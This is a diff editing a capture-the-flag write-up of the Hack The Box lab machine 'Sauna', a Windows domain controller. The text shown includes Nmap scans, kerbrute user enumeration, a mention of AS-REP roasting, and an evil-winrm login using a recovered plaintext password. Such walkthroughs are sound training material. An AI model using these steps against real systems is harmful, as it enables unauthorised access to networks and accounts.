@@ -1,3 +1,4 @@
+
 # HTB - Sauna
 
 **IP Address:** `10.10.10.175`  
@@ -32,6 +33,9 @@ It involves enumerating users via LDAP, exploiting an **AS-REP Roasting** vulner
 
 ### 1.1 Connectivity Test
 
+Check if the host is alive using ICMP:
+
+
 We start by verifying if the target is alive:
 
 ```bash
@@ -44,6 +48,9 @@ The host responds, confirming connectivity.
 
 ---
 ### 1.2 Port Scanning
+
+Scan all TCP ports to identify open services:
+
 
 We scan all ports with Nmap:
 
@@ -70,6 +77,9 @@ extractPorts allports
 
 ---
 ### 1.3 Targeted Scan
+
+Run a deeper scan on the identified ports with version detection and default scripts:
+
 
 Using the discovered ports, we run a deeper service/version scan:
 
@@ -106,7 +116,7 @@ nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49668,49673
 At this point, we confirm the host is a **Windows Domain Controller**.
 
 ---
-## 2. User Enumeration
+## 2. Service Enumeration
 
 ### 2.1 SMB & RPC Attempts
 
@@ -176,11 +186,15 @@ kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.10.10.175 users.txt
 The user **hsmith** is valid.
 
 ---
-## 3. Foothold via AS-REP Roasting
+## 3. Foothold
 
 ### 3.1 Web Enumeration for More Users
 
-Browsing the web service, we find more usernames in the **About Us** section:
+Browse the corporate site for additional username candidates beyond the initial wordlist:
+
+```bash
+curl -i http://10.10.10.175/
+```
 
 ![web_team](screenshots/web_team.png)
 
@@ -279,6 +293,9 @@ Validate with CrackMapExec:
 
 ---
 ### 4.3 Access as svc_loanmgr
+
+Continue the attack chain with the next commands:
+
 
 ```bash
 evil-winrm -i 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'
